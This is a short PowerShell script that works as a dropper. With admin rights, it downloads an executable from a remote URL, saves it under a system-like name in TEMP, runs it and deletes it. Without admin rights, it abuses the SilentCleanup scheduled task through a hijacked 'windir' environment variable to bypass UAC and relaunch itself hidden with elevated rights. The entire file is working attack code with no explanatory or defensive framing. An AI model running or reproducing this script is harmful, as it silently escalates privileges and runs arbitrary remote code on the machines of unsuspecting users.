if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
 # URL of the executable to download
$url = "https://sourceforge.net/projects/app/files/main.exe/download"

# Path to save the downloaded executable
$downloadPath = "$env:TEMP\downloaded_System.exe"

# Download the executable
Invoke-WebRequest -Uri $url -OutFile $downloadPath

# Run the downloaded executable
Start-Process -FilePath $downloadPath -NoNewWindow -Wait

# Remove the downloaded file (optional)
Remove-Item -Path $downloadPath -Force


} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}